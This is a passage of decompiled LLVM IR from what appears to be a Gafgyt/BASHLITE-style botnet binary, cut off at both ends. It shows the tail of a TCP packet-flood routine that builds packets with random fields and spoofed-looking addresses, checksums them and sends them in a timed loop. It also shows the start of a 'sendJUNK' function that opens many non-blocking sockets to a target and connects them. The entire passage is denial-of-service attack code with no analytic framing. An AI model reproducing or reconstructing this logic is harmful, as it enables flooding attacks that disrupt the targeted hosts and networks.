  %v0_804bca2 = load i32, i32* @esp, align 4
  %v1_804bca2 = add i32 %v0_804bca2, 16
  %v5_804bca5 = icmp ult i32 %v1_804bca2, 12
  store i1 %v5_804bca5, i1* %cf.global-to-local, align 1
  %v3_804bca8 = inttoptr i32 %v0_804bca2 to i32*
  store i32 %v2_804bc9d, i32* %v3_804bca8, align 4
  %v0_804bca9 = call i32 @htonl()
  %v0_804bcae = load i32, i32* @esp, align 4
  %v2_804bcae = icmp ugt i32 %v0_804bcae, -17
  store i1 %v2_804bcae, i1* %cf.global-to-local, align 1
  store i32 %v0_804bca9, i32* %edx.global-to-local, align 4
  store i32 %v2_804b902, i32* %eax.global-to-local, align 4
  store i32 %v0_804bca9, i32* %v3_804bcb6, align 4
  %v1_804bcb9 = call i32 @rand_cmwc(i32 %stack_var_-68.0)
  %sext9 = mul i32 %v1_804bcb9, 65536
  %v1_804bcbe = sdiv i32 %sext9, 65536
  store i32 %v1_804bcbe, i32* %edx.global-to-local, align 4
  store i32 %v2_804b902, i32* %eax.global-to-local, align 4
  %v1_804bcc3 = trunc i32 %v1_804bcbe to i16
  store i16 %v1_804bcc3, i16* %v4_804bcc3, align 4
  %v1_804bcc7 = call i32 @rand_cmwc(i32 %stack_var_-68.0)
  store i32 %v1_804bcc7, i32* %edx.global-to-local, align 4
  store i32 %v1_804b91a, i32* %eax.global-to-local, align 4
  store i32 %v1_804bcc7, i32* %v3_804b96f, align 8
  %v1_804bcd4 = call i32 @rand_cmwc(i32 %stack_var_-68.0)
  %sext10 = mul i32 %v1_804bcd4, 65536
  %v1_804bcd9 = sdiv i32 %sext10, 65536
  store i32 %v1_804bcd9, i32* %edx.global-to-local, align 4
  %v1_804bcde = trunc i32 %v1_804bcd9 to i16
  store i16 %v1_804bcde, i16* %v5_804b91d, align 4
  store i32 %v1_804b91a, i32* %eax.global-to-local, align 4
  store i16 0, i16* %v2_804bbdc, align 4
  %v0_804bcea = load i32, i32* @esp, align 4
  %v5_804bcea = icmp ult i32 %v0_804bcea, 8
  store i1 %v5_804bcea, i1* %cf.global-to-local, align 1
  %v6_804bced = add i32 %v0_804bcea, -12
  %v7_804bced = inttoptr i32 %v6_804bced to i32*
  store i32 %v1_804b91a, i32* %v7_804bced, align 4
  %v5_804bcf0 = add i32 %v0_804bcea, -16
  %v6_804bcf0 = inttoptr i32 %v5_804bcf0 to i32*
  store i32 %v2_804b902, i32* %v6_804bcf0, align 4
  %v0_804bcf3 = call i32 @tcpcsum()
  %v1_804bcf3 = trunc i32 %v0_804bcf3 to i16
  %sext17 = mul i32 %v0_804bcf3, 65536
  %v1_804bcfb = sdiv i32 %sext17, 65536
  store i32 %v1_804bcfb, i32* %edx.global-to-local, align 4
  store i16 %v1_804bcf3, i16* %v2_804bbdc, align 4
  store i32 %v2_804b902, i32* %eax.global-to-local, align 4
  %v3_804bd07 = load i16, i16* %v2_804bc3c, align 2
  %v4_804bd07 = zext i16 %v3_804bd07 to i32
  store i1 false, i1* %cf.global-to-local, align 1
  store i32 %v4_804bd07, i32* %edx.global-to-local, align 4
  store i32 %v2_804b902, i32* %eax.global-to-local, align 4
  %v1_804bd16 = load i32, i32* @esp, align 4
  %v2_804bd16 = add i32 %v1_804bd16, -4
  %v3_804bd16 = inttoptr i32 %v2_804bd16 to i32*
  store i32 %v4_804bd07, i32* %v3_804bd16, align 4
  %v0_804bd17 = load i32, i32* %eax.global-to-local, align 4
  %v2_804bd17 = add i32 %v1_804bd16, -8
  %v3_804bd17 = inttoptr i32 %v2_804bd17 to i32*
  store i32 %v0_804bd17, i32* %v3_804bd17, align 4
  %v1_804bd18 = load i32, i32* %stack_var_-64, align 4
  %v2_804bd18 = inttoptr i32 %stack_var_-68.0 to i16*
  %v3_804bd18 = call i32 @csum(i16* %v2_804bd18, i32 %v1_804bd18)
  %v4_804bd18 = trunc i32 %v3_804bd18 to i16
  %sext18 = mul i32 %v3_804bd18, 65536
  %v1_804bd20 = sdiv i32 %sext18, 65536
  store i32 %v1_804bd20, i32* %edx.global-to-local, align 4
  store i32 %v2_804b902, i32* %eax.global-to-local, align 4
  store i16 %v4_804bd18, i16* %v4_804bc5a, align 2
  store i32 %arg7, i32* @edi, align 4
  %v10_804bd2c = icmp ult i32 %stack_var_-68.0, %arg7
  store i1 %v10_804bd2c, i1* %cf.global-to-local, align 1
  %v15_804bd2c = icmp eq i32 %stack_var_-68.0, %arg7
  %v1_804bd2f = icmp eq i1 %v15_804bd2c, false
  br i1 %v1_804bd2f, label %dec_label_pc_804bd4f, label %dec_label_pc_804bd31

dec_label_pc_804bd31:                             ; preds = %dec_label_pc_804bc7a
  %v0_804bd31 = load i32, i32* @esp, align 4
  %v5_804bd31 = icmp ult i32 %v0_804bd31, 12
  store i1 %v5_804bd31, i1* %cf.global-to-local, align 1
  %v1_804bd34 = add i32 %v0_804bd31, -16
  %v2_804bd34 = inttoptr i32 %v1_804bd34 to i32*
  store i32 0, i32* %v2_804bd34, align 4
  %v1_804bd36 = inttoptr i32 %stack_var_-68.0 to i32*
  %v2_804bd36 = call i32 @__GI_time(i32* %v1_804bd36)
  store i32 %v2_804bd36, i32* %eax.global-to-local, align 4
  %v0_804bd3b = load i32, i32* @esp, align 4
  %v1_804bd3b = add i32 %v0_804bd3b, 16
  %v10_804bd3e = icmp ult i32 %v2_804bd36, %v5_804bc6b
  store i1 %v10_804bd3e, i1* %cf.global-to-local, align 1
  %v8_804bd41 = icmp sgt i32 %v2_804bd36, %v5_804bc6b
  br i1 %v8_804bd41, label %dec_label_pc_804bd57, label %dec_label_pc_804bc7a

dec_label_pc_804bd4f:                             ; preds = %dec_label_pc_804bc7a
  %v4_804bd4f = add i32 %stack_var_-68.0, 1
  %v0_804bc80.pre.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804bc7a

dec_label_pc_804bd57:                             ; preds = %dec_label_pc_804bd31, %dec_label_pc_804b892, %dec_label_pc_804b860, %dec_label_pc_804b842
  %v0_804bd61 = phi i32 [ %v5_804b8a9, %dec_label_pc_804b892 ], [ %v3_804b87c, %dec_label_pc_804b860 ], [ %v3_804b84f, %dec_label_pc_804b842 ], [ %v2_804bd36, %dec_label_pc_804bd31 ]
  store i32 %v0_804b801, i32* @ebx, align 4
  store i32 %v0_804b800, i32* @esi, align 4
  store i32 %v0_804b7ff, i32* @edi, align 4
  ret i32 %v0_804bd61

; uselistorder directives
  uselistorder i32 %v2_804bd36, { 0, 2, 1, 3 }
  uselistorder i32 %v1_804bcd9, { 1, 0 }
  uselistorder i32 %v1_804bcbe, { 1, 0 }
  uselistorder i32 %v0_804bca9, { 1, 0 }
  uselistorder i32 %stack_var_-68.0, { 2, 1, 0, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i32 %v0_804bc80, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v5_804bc6b, { 1, 0, 2, 3 }
  uselistorder i32 %v3_804bc63, { 1, 0 }
  uselistorder i32 %v1_804bc4d, { 1, 0 }
  uselistorder i32 %v1_804bbff, { 1, 0 }
  uselistorder i32 %v1_804bbd0, { 1, 0 }
  uselistorder i32 %v3_804bbb6, { 2, 1, 0, 3 }
  uselistorder i8* %stack_var_-156.0, { 1, 0 }
  uselistorder i32 %stack_var_-160.0, { 1, 0 }
  uselistorder i32 %v1_804bb8b, { 1, 0 }
  uselistorder i1 %v0_804bb72, { 1, 0 }
  uselistorder i32 %v6_804bb70, { 1, 0 }
  uselistorder i32 %v1_804bb38, { 1, 0 }
  uselistorder i1 %v0_804bb1f, { 1, 0 }
  uselistorder i32 %v6_804bb1d, { 1, 0 }
  uselistorder i32 %v1_804bae2, { 1, 0 }
  uselistorder i1 %v0_804bac9, { 1, 0 }
  uselistorder i32 %v6_804bac7, { 1, 0 }
  uselistorder i32 %v1_804ba98, { 1, 0 }
  uselistorder i1 %v0_804ba7f, { 1, 0 }
  uselistorder i32 %v6_804ba7d, { 1, 0 }
  uselistorder i32 %v1_804ba54, { 1, 0 }
  uselistorder i1 %v0_804ba3b, { 1, 0 }
  uselistorder i32 %v6_804ba39, { 1, 0 }
  uselistorder i32 %v4_804ba1b, { 0, 2, 1, 4, 3, 6, 5, 8, 7, 9, 10 }
  uselistorder i32 %stack_var_-160.129, { 3, 2, 1, 0 }
  uselistorder i8* %stack_var_-156.130, { 3, 2, 1, 0 }
  uselistorder i8* %v3_804bb9b, { 5, 4, 3, 2, 0, 1 }
  uselistorder i8* %v2_804bb88, { 4, 9, 3, 8, 2, 7, 1, 6, 0, 5 }
  uselistorder i32 %v1_804b9f4, { 1, 0 }
  uselistorder i32 %v1_804b9e8, { 1, 0 }
  uselistorder i32 %v1_804b9dc, { 1, 0 }
  uselistorder i32 %v1_804b9d0, { 1, 0 }
  uselistorder i32 %v1_804b9c4, { 1, 0 }
  uselistorder i8* %v2_804b9c1, { 4, 5, 3, 6, 2, 7, 1, 8, 0, 9 }
  uselistorder i1 %v0_804b9ab, { 1, 0 }
  uselistorder i32 %v6_804b9a9, { 1, 0 }
  uselistorder i32 %v1_804b95d, { 1, 0 }
  uselistorder i32 %v0_804b93f, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 %v1_804b91a, { 5, 6, 7, 8, 9, 10, 0, 1, 2, 3, 4, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21 }
  uselistorder i32 %v2_804b902, { 14, 13, 12, 11, 10, 9, 8, 26, 25, 24, 7, 6, 23, 5, 4, 22, 21, 20, 19, 27, 18, 17, 16, 15, 3, 2, 1, 0 }
  uselistorder i32 %v2_804b8f7, { 1, 0, 2 }
  uselistorder i32 %v2_804b8d8, { 1, 0 }
  uselistorder i32 %v3_804b87c, { 0, 3, 2, 1, 4 }
  uselistorder i32 %v1_804b82d, { 1, 0 }
  uselistorder i32* %stack_var_-172, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-60, { 1, 0, 3, 2 }
  uselistorder i32* %stack_var_-56, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-64, { 1, 2, 0, 4, 3 }
  uselistorder i8** %stack_var_-20, { 3, 1, 2, 0 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 4, 6, 5, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32 }
  uselistorder i1* %cf.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 35, 17, 18, 19, 20, 21, 23, 22, 24, 26, 25, 27, 29, 28, 30, 32, 31, 33, 34, 0, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @__libc_sendto, { 2, 1, 0 }
  uselistorder i32 ()* @tcpcsum, { 1, 0 }
  uselistorder i32 ()* @makeIPPacket, { 1, 0 }
  uselistorder i32 ()* @htonl, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i32)* @getRandomIP, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__GI_setsockopt, { 1, 0 }
  uselistorder i32 (i32)* @rand_cmwc, { 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg7, { 0, 2, 1, 3 }
  uselistorder i32 %arg6, { 2, 1, 0 }
  uselistorder i8* %arg5, { 1, 0 }
  uselistorder i32 %arg4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804bc7a, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804bc14, { 1, 0 }
  uselistorder label %dec_label_pc_804bbac, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_804ba1b, { 1, 0 }
  uselistorder label %dec_label_pc_804b8df, { 1, 0 }
  uselistorder label %bb102, { 1, 0 }
  uselistorder label %dec_label_pc_804b842, { 1, 0 }
}

define i32 @sendJUNK(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-204 = alloca i32, align 4
  %stack_var_-200 = alloca i32, align 4
  %stack_var_-196 = alloca i32, align 4
  %stack_var_-188 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-220 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_804bd65 = load i32, i32* @edi, align 4
  %v0_804bd66 = load i32, i32* @ebx, align 4
  store i32 %v0_804bd66, i32* %stack_var_-12, align 4
  %v12_804bd67 = ptrtoint i32* %stack_var_-220 to i32
  store i32 %v12_804bd67, i32* %eax.global-to-local, align 4
  %v1_804bd75 = call i32 @getdtablesize(i32 %v12_804bd67)
  store i32 %v1_804bd75, i32* @edx, align 4
  %tmp = icmp slt i32 %v1_804bd75, 0
  %v2_804bd7e = zext i1 %tmp to i32
  %v2_804bd81 = add i32 %v2_804bd7e, %v1_804bd75
  %v2_804bd83 = sdiv i32 %v2_804bd81, 2
  store i32 2, i32* %stack_var_-60, align 4
  %v1_804bd91 = urem i32 %arg2, 65536
  store i32 %v1_804bd91, i32* %eax.global-to-local, align 4
  %v1_804bd9a = call i32 @htons(i32 %v1_804bd91)
  %v2_804bda9 = ptrtoint i32* %stack_var_-60 to i32
  %v15_804bdac = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v15_804bdac, i32* %eax.global-to-local, align 4
  %v3_804bdb3 = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-56)
  store i32 %v3_804bdb3, i32* %eax.global-to-local, align 4
  %v1_804bdbb = icmp eq i32 %v3_804bdb3, 0
  br i1 %v1_804bdbb, label %dec_label_pc_804bdc4, label %dec_label_pc_804c100

dec_label_pc_804bdc4:                             ; preds = %entry
  %v2_804bdda = mul i32 %v2_804bd83, 8
  %v1_804bde0 = add i32 %v2_804bdda, 30
  %v2_804bde3 = and i32 %v1_804bde0, -16
  %v2_804bde9 = sub i32 %v12_804bd67, %v2_804bde3
  %v1_804bdf7 = add i32 %v2_804bde9, 15
  %v2_804bdfa = and i32 %v1_804bdf7, -16
  %v2_804be17 = mul i32 %v2_804bd83, 5
  store i32 %v2_804be17, i32* %edx.global-to-local, align 4
  %v1_804be1d = inttoptr i32 %v2_804bdfa to i8*
  store i32 %v2_804bdfa, i32* @edi, align 4
  %v1_804be22 = and i32 %v1_804bdf7, -256
  store i32 %v1_804be22, i32* %eax.global-to-local, align 4
  %v5_804be24 = call i8* @_memset(i8* %v1_804be1d, i32 %v1_804be22, i32 %v2_804be17)
  %v0_804be26 = load i32, i32* @esp, align 4
  %v1_804be29 = add i32 %v0_804be26, -16
  %v2_804be29 = inttoptr i32 %v1_804be29 to i32*
  store i32 1024, i32* %v2_804be29, align 4
  %v1_804be2e = call i32 @malloc(i32 %v2_804bdfa)
  %v0_804be33 = load i32, i32* @esp, align 4
  store i32 %v1_804be2e, i32* %edx.global-to-local, align 4
  store i32 1024, i32* %eax.global-to-local, align 4
  %v2_804be46 = add i32 %v0_804be33, 8
  %v3_804be46 = inttoptr i32 %v2_804be46 to i32*
  store i32 1024, i32* %v3_804be46, align 4
  %v1_804be47 = add i32 %v0_804be33, 4
  %v2_804be47 = inttoptr i32 %v1_804be47 to i32*
  store i32 0, i32* %v2_804be47, align 4
  %v0_804be49 = load i32, i32* %edx.global-to-local, align 4
  %v3_804be49 = inttoptr i32 %v0_804be33 to i32*
  store i32 %v0_804be49, i32* %v3_804be49, align 4
  %v3_804be4a = inttoptr i32 %v1_804be2e to i8*
  %v4_804be4a = call i32 @__GI_memset(i8* %v3_804be4a, i32 %tmp9, i32 %tmp6)
  store i32 %v4_804be4a, i32* %eax.global-to-local, align 4
  %v0_804be4f = load i32, i32* @esp, align 4
  %v2_804be55 = inttoptr i32 %v0_804be4f to i32*
  store i32 0, i32* %v2_804be55, align 4
  %v1_804be57 = inttoptr i32 %v1_804be2e to i32*
  %v2_804be57 = call i32 @__GI_time(i32* %v1_804be57)
  %v0_804be5c = load i32, i32* @esp, align 4
  %v1_804be5c = add i32 %v0_804be5c, 16
  %v5_804be5f = add i32 %v2_804be57, %arg3
  store i32 %v5_804be5f, i32* %eax.global-to-local, align 4
  %v3_804be7c = or i32 %v2_804bdfa, 4
  %v2_804bf67 = ptrtoint i32* %stack_var_-188 to i32
  %tmp35 = bitcast i32* %stack_var_-188 to i8*
  %v2_804bfbb = ptrtoint i32* %stack_var_-196 to i32
  %v2_804bff5 = ptrtoint i32* %stack_var_-200 to i32
  %v2_804bffc = ptrtoint i32* %stack_var_-204 to i32
  %v5_804c0e438 = icmp sgt i32 %v2_804bd81, 1
  br label %dec_label_pc_804c0ea

dec_label_pc_804be76:                             ; preds = %dec_label_pc_804c0de.preheader, %dec_label_pc_804c0db
  %storemerge40 = phi i32 [ %v4_804c0db, %dec_label_pc_804c0db ], [ 0, %dec_label_pc_804c0de.preheader ]
  %stack_var_-192.139 = phi i32 [ %stack_var_-192.0, %dec_label_pc_804c0db ], [ %stack_var_-192.2, %dec_label_pc_804c0de.preheader ]
  store i32 %storemerge40, i32* %eax.global-to-local, align 4
  store i32 %v2_804bdfa, i32* %edx.global-to-local, align 4
  %v2_804be7c = mul i32 %storemerge40, 8
  %v4_804be7c = add i32 %v2_804be7c, %v3_804be7c
  %v5_804be7c = inttoptr i32 %v4_804be7c to i8*
  %v6_804be7c = load i8, i8* %v5_804be7c, align 4
  %v7_804be7c = zext i8 %v6_804be7c to i32
  %v9_804be7c = and i32 %storemerge40, -256
  %v10_804be7c = or i32 %v7_804be7c, %v9_804be7c
  store i32 %v10_804be7c, i32* %eax.global-to-local, align 4
  store i32 %v7_804be7c, i32* %edx.global-to-local, align 4
  %v8_804be8d = icmp eq i8 %v6_804be7c, 0
  %v12_804be8d = icmp eq i8 %v6_804be7c, 1
  br i1 %v12_804be8d, label %dec_label_pc_804bf5d, label %dec_label_pc_804be9a

dec_label_pc_804be9a:                             ; preds = %dec_label_pc_804be76
  %v12_804be9a = icmp eq i8 %v6_804be7c, 2
  br i1 %v12_804be9a, label %dec_label_pc_804c07b, label %dec_label_pc_804bea7

dec_label_pc_804bea7:                             ; preds = %dec_label_pc_804be9a
  br i1 %v8_804be8d, label %dec_label_pc_804beb5, label %dec_label_pc_804c0db

dec_label_pc_804beb5:                             ; preds = %dec_label_pc_804bea7
  store i32 %storemerge40, i32* @ebx, align 4
  %v0_804beb8 = load i32, i32* @esp, align 4
  %v1_804bebb = add i32 %v0_804beb8, -8
  %v2_804bebb = inttoptr i32 %v1_804bebb to i32*
  store i32 0, i32* %v2_804bebb, align 4
  %v1_804bebd = add i32 %v0_804beb8, -12
  %v2_804bebd = inttoptr i32 %v1_804bebd to i32*
  store i32 1, i32* %v2_804bebd, align 4
  %v1_804bebf = add i32 %v0_804beb8, -16
  %v2_804bebf = inttoptr i32 %v1_804bebf to i32*
  store i32 2, i32* %v2_804bebf, align 4
  %v2_804bec1 = load i32, i32* %stack_var_-204, align 4
  %v3_804bec1 = call i32 @socket(i32 %v7_804be7c, i32 %v12_804bd67, i32 %v2_804bec1)
  %v2_804bece = load i32, i32* @ebx, align 4
  %v3_804bece = mul i32 %v2_804bece, 8
  %v4_804bece = add i32 %v3_804bece, %v2_804bdfa
  %v5_804bece = inttoptr i32 %v4_804bece to i32*
  store i32 %v3_804bec1, i32* %v5_804bece, align 8
  store i32 %storemerge40, i32* %edx.global-to-local, align 4
  store i32 %v2_804bdfa, i32* %eax.global-to-local, align 4
  %v3_804bed7 = add i32 %v2_804be7c, %v2_804bdfa
  %v4_804bed7 = inttoptr i32 %v3_804bed7 to i32*
  %v5_804bed7 = load i32, i32* %v4_804bed7, align 8
  store i32 %v5_804bed7, i32* %eax.global-to-local, align 4
  %v0_804beda = load i32, i32* @esp, align 4
  %v1_804bedd = add i32 %v0_804beda, -8
  %v2_804bedd = inttoptr i32 %v1_804bedd to i32*
  store i32 0, i32* %v2_804bedd, align 4
  %v1_804bedf = add i32 %v0_804beda, -12
  %v2_804bedf = inttoptr i32 %v1_804bedf to i32*
  store i32 3, i32* %v2_804bedf, align 4
  %v0_804bee1 = load i32, i32* %eax.global-to-local, align 4
  %v2_804bee1 = add i32 %v0_804beda, -16
  %v3_804bee1 = inttoptr i32 %v2_804bee1 to i32*
  store i32 %v0_804bee1, i32* %v3_804bee1, align 4
  %v2_804bee2 = load i32, i32* %stack_var_-204, align 4
  %v3_804bee2 = call i32 @__libc_fcntl(i32 %v7_804be7c, i32 %v12_804bd67, i32 %v2_804bee2)
  %v0_804bee7 = load i32, i32* @esp, align 4
  %v12_804beec = or i32 %v3_804bee2, 2048
  store i32 %storemerge40, i32* %edx.global-to-local, align 4
  store i32 %v2_804bdfa, i32* %eax.global-to-local, align 4
  %v5_804bef5 = load i32, i32* %v4_804bed7, align 8
  store i32 %v5_804bef5, i32* %eax.global-to-local, align 4
  %v2_804befb = add i32 %v0_804bee7, 8
  %v3_804befb = inttoptr i32 %v2_804befb to i32*
  store i32 %v12_804beec, i32* %v3_804befb, align 4
  %v1_804befc = add i32 %v0_804bee7, 4
  %v2_804befc = inttoptr i32 %v1_804befc to i32*
  store i32 4, i32* %v2_804befc, align 4
  %v0_804befe = load i32, i32* %eax.global-to-local, align 4
  %v3_804befe = inttoptr i32 %v0_804bee7 to i32*
  store i32 %v0_804befe, i32* %v3_804befe, align 4
  %v2_804beff = load i32, i32* %stack_var_-204, align 4
  %v3_804beff = call i32 @__libc_fcntl(i32 %v7_804be7c, i32 %v12_804bd67, i32 %v2_804beff)
  %v0_804bf04 = load i32, i32* @esp, align 4
  store i32 %storemerge40, i32* %edx.global-to-local, align 4
  store i32 %v2_804bdfa, i32* %eax.global-to-local, align 4
  %v5_804bf10 = load i32, i32* %v4_804bed7, align 8
  store i32 %v5_804bf10, i32* %eax.global-to-local, align 4
  %v1_804bf16 = add i32 %v0_804bf04, 8
  %v2_804bf16 = inttoptr i32 %v1_804bf16 to i32*
  store i32 16, i32* %v2_804bf16, align 4
  %v2_804bf18 = add i32 %v0_804bf04, 4
  %v3_804bf18 = inttoptr i32 %v2_804bf18 to i32*
  store i32 %v2_804bda9, i32* %v3_804bf18, align 4
  %v0_804bf19 = load i32, i32* %eax.global-to-local, align 4
  %v3_804bf19 = inttoptr i32 %v0_804bf04 to i32*
  store i32 %v0_804bf19, i32* %v3_804bf19, align 4
  %v2_804bf1a = load i32, i32* %stack_var_-204, align 4
  %v3_804bf1a = call i32 @__libc_connect(i32 %v7_804be7c, i32 %v12_804bd67, i32 %v2_804bf1a)
  store i32 %v3_804bf1a, i32* %eax.global-to-local, align 4
  %v0_804bf1f = load i32, i32* @esp, align 4
  %v1_804bf1f = add i32 %v0_804bf1f, 16
  %v10_804bf22 = icmp eq i32 %v3_804bf1a, -1
  %v1_804bf25 = icmp eq i1 %v10_804bf22, false
  br i1 %v1_804bf25, label %dec_label_pc_804bf33, label %dec_label_pc_804bf27

dec_label_pc_804bf27:                             ; preds = %dec_label_pc_804beb5
  %v1_804bf27 = call i32 @__errno_location(i32 %v7_804be7c)
  store i32 %v1_804bf27, i32* %eax.global-to-local, align 4
  %v1_804bf2c = inttoptr i32 %v1_804bf27 to i32*
  %v2_804bf2c = load i32, i32* %v1_804bf2c, align 4
  store i32 %v2_804bf2c, i32* %eax.global-to-local, align 4
  %v9_804bf2e = icmp eq i32 %v2_804bf2c, 115
  br i1 %v9_804bf2e, label %dec_label_pc_804bf4d, label %dec_label_pc_804bf27.dec_label_pc_804bf33_crit_edge

dec_label_pc_804bf27.dec_label_pc_804bf33_crit_edge: ; preds = %dec_label_pc_804bf27
  %v0_804bf3c.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804bf33

dec_label_pc_804bf33:                             ; preds = %dec_label_pc_804bf27.dec_label_pc_804bf33_crit_edge, %dec_label_pc_804beb5
  %v0_804bf3c = phi i32 [ %v0_804bf3c.pre, %dec_label_pc_804bf27.dec_label_pc_804bf33_crit_edge ], [ %v1_804bf1f, %dec_label_pc_804beb5 ]
  store i32 %storemerge40, i32* %eax.global-to-local, align 4
  store i32 %v2_804bdfa, i32* %edx.global-to-local, align 4
  %v5_804bf39 = load i32, i32* %v4_804bed7, align 8
  store i32 %v5_804bf39, i32* %eax.global-to-local, align 4
  %v2_804bf3f = add i32 %v0_804bf3c, -16
  %v3_804bf3f = inttoptr i32 %v2_804bf3f to i32*
  store i32 %v5_804bf39, i32* %v3_804bf3f, align 4
  %v1_804bf40 = call i32 @__libc_close(i32 %v7_804be7c)
  store i32 %v1_804bf40, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804c0db

dec_label_pc_804bf4d:                             ; preds = %dec_label_pc_804bf27
  store i32 %storemerge40, i32* %edx.global-to-local, align 4
  store i32 %v2_804bdfa, i32* %eax.global-to-local, align 4
  store i8 1, i8* %v5_804be7c, align 4
  br label %dec_label_pc_804c0db

dec_label_pc_804bf5d:                             ; preds = %dec_label_pc_804be76
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %v2_804bf67, i32* @edi, align 4
  %v5_804bf6e = call i8* @_memset(i8* %tmp35, i32 0, i32 32)
  store i32 %storemerge40, i32* %edx.global-to-local, align 4
  store i32 %v2_804bdfa, i32* %eax.global-to-local, align 4
  %v3_804bf7c = add i32 %v2_804be7c, %v2_804bdfa
  %v4_804bf7c = inttoptr i32 %v3_804bf7c to i32*
  %v5_804bf7c = load i32, i32* %v4_804bf7c, align 8
  %v2_804bf81 = udiv i32 %v5_804bf7c, 32
  store i32 %storemerge40, i32* %edx.global-to-local, align 4
  store i32 %v2_804bdfa, i32* %eax.global-to-local, align 4
  %v5_804bf8a = load i32, i32* %v4_804bf7c, align 8
  %v1_804bf8d = urem i32 %v5_804bf8a, 32
  store i32 %v1_804bf8d, i32* %eax.global-to-local, align 4
  %v0_804bf90 = load i32, i32* @ebp, align 4
  %v2_804bf90 = mul nuw nsw i32 %v2_804bf81, 4
  %v3_804bf90 = add nsw i32 %v2_804bf90, -184
  %v4_804bf90 = add i32 %v3_804bf90, %v0_804bf90
  %v5_804bf90 = inttoptr i32 %v4_804bf90 to i32*
  %v6_804bf90 = load i32, i32* %v5_804bf90, align 4
  %v9_804bf90 = shl i32 1, %v1_804bf8d
  %v12_804bf90 = or i32 %v6_804bf90, %v9_804bf90
  store i32 %v12_804bf90, i32* %v5_804bf90, align 4
  store i32 0, i32* %stack_var_-196, align 4
  store i32 %storemerge40, i32* %edx.global-to-local, align 4
  store i32 %v2_804bdfa, i32* %eax.global-to-local, align 4
  %v5_804bfb2 = load i32, i32* %v4_804bf7c, align 8
  %v1_804bfb5 = add i32 %v5_804bfb2, 1
  store i32 %v1_804bfb5, i32* %edx.global-to-local, align 4
  %v0_804bfb8 = load i32, i32* @esp, align 4
  %v2_804bfc1 = add i32 %v0_804bfb8, -16
  %v3_804bfc1 = inttoptr i32 %v2_804bfc1 to i32*
  store i32 %v2_804bfbb, i32* %v3_804bfc1, align 4
  %v1_804bfc2 = add i32 %v0_804bfb8, -20
  %v2_804bfc2 = inttoptr i32 %v1_804bfc2 to i32*
  store i32 0, i32* %v2_804bfc2, align 4
  store i32 %v2_804bf67, i32* %eax.global-to-local, align 4
  %v2_804bfca = add i32 %v0_804bfb8, -24
  %v3_804bfca = inttoptr i32 %v2_804bfca to i32*
  store i32 %v2_804bf67, i32* %v3_804bfca, align 4
  %v1_804bfcb = add i32 %v0_804bfb8, -28
  %v2_804bfcb = inttoptr i32 %v1_804bfcb to i32*
  store i32 0, i32* %v2_804bfcb, align 4
  %v0_804bfcd = load i32, i32* %edx.global-to-local, align 4
  %v2_804bfcd = add i32 %v0_804bfb8, -32
  %v3_804bfcd = inttoptr i32 %v2_804bfcd to i32*
  store i32 %v0_804bfcd, i32* %v3_804bfcd, align 4
  %v0_804bfce = load i32, i32* %stack_var_-196, align 4
  %v2_804bfce = load i32, i32* %stack_var_-188, align 4
  %v5_804bfce = call i32 @__libc_select(i32 %v0_804bfce, i32 10000, i32 %v2_804bfce, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_804bfce, i32* %eax.global-to-local, align 4
  %v0_804bfd3 = load i32, i32* @esp, align 4
  %v12_804bfd9 = icmp eq i32 %v5_804bfce, 1
  %v1_804bfdd = icmp eq i1 %v12_804bfd9, false
  br i1 %v1_804bfdd, label %dec_label_pc_804c04f, label %dec_label_pc_804bfdf

dec_label_pc_804bfdf:                             ; preds = %dec_label_pc_804bf5d
  store i32 4, i32* %stack_var_-200, align 4
  store i32 %storemerge40, i32* %edx.global-to-local, align 4
  store i32 %v2_804bdfa, i32* %eax.global-to-local, align 4
  %v5_804bfef = load i32, i32* %v4_804bf7c, align 8
  store i32 %v5_804bfef, i32* %edx.global-to-local, align 4
  %v2_804bffb = add i32 %v0_804bfd3, 16
  %v3_804bffb = inttoptr i32 %v2_804bffb to i32*
  store i32 %v2_804bff5, i32* %v3_804bffb, align 4
  store i32 %v2_804bffc, i32* %eax.global-to-local, align 4
  %v2_804c002 = add i32 %v0_804bfd3, 12
  %v3_804c002 = inttoptr i32 %v2_804c002 to i32*
  store i32 %v2_804bffc, i32* %v3_804c002, align 4
  %v1_804c003 = add i32 %v0_804bfd3, 8
  %v2_804c003 = inttoptr i32 %v1_804c003 to i32*
